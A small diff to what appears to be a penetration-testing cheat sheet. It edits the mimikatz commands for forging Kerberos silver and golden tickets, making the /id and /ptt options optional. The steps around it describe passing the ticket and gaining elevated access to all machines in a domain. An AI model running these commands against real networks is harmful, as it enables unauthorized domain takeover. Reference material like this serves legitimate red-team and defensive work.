@@ -381,7 +381,7 @@ mimikatz # kerberos::ptt <ticket>
 2. Create a silver ticket:
 
 	```cmd
-	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SERVICE_SID> /krbtgt:<SERVICE_NTLM_HASH> /id:1103
+	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SERVICE_SID> /krbtgt:<SERVICE_NTLM_HASH> [/id:1103] [/ptt]
 	```
 
 3. Open a new command prompt with elevated privileges with the given ticket:
@@ -401,7 +401,7 @@ mimikatz # kerberos::ptt <ticket>
 2. Create a golden ticket:
 
 	```cmd
-	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /id:500
+	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> [/id:500] [/ptt]
 	```
 
 3. Open a new command prompt with elevated privileges and access to all machines with:
